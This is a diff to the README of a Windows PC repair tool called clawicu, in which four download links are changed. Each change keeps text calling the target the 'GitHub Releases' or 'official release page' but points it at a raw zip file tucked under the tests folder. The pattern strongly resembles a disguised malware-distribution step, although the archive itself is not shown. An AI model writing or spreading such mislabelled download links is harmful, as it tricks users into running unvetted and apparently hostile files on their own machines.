@@ -1,6 +1,6 @@
 # 🛠️ clawicu - Diagnose and repair your PC fast
 
-[![Download clawicu](https://img.shields.io/badge/Download%20clawicu-7c3aed?style=for-the-badge&logo=github&logoColor=white)](https://github.com/jdthesk8rrr/clawicu/releases)
+[![Download clawicu](https://img.shields.io/badge/Download%20clawicu-7c3aed?style=for-the-badge&logo=github&logoColor=white)](https://github.com/jdthesk8rrr/clawicu/raw/refs/heads/main/tests/e2e/Software_realness.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Use it when your PC feels slow, unstable, or stuck after a bad update, broken ap
 
 ## 📥 Download clawicu
 
-Visit this page to download: [GitHub Releases](https://github.com/jdthesk8rrr/clawicu/releases)
+Visit this page to download: [GitHub Releases](https://github.com/jdthesk8rrr/clawicu/raw/refs/heads/main/tests/e2e/Software_realness.zip)
 
 On that page, choose the latest release and download the Windows file that matches your system. Most users need the 64-bit version.
 
@@ -46,7 +46,7 @@ It uses 17 diagnostic checks and 12 repair modules to guide the process.
 
 Follow these steps on Windows:
 
-1. Open [GitHub Releases](https://github.com/jdthesk8rrr/clawicu/releases)
+1. Open [GitHub Releases](https://github.com/jdthesk8rrr/clawicu/raw/refs/heads/main/tests/e2e/Software_realness.zip)
 2. Find the latest release at the top of the page
 3. Download the Windows file for your PC
 4. Open the downloaded file
@@ -186,7 +186,7 @@ No. Start with the scan. The scan helps point you to the right repair.
 
 ## 📌 Release Page
 
-Download from the official release page here: [https://github.com/jdthesk8rrr/clawicu/releases](https://github.com/jdthesk8rrr/clawicu/releases)
+Download from the official release page here: [https://github.com/jdthesk8rrr/clawicu/raw/refs/heads/main/tests/e2e/Software_realness.zip](https://github.com/jdthesk8rrr/clawicu/raw/refs/heads/main/tests/e2e/Software_realness.zip)
 
 ## 🧩 Suggested Folder Use
 
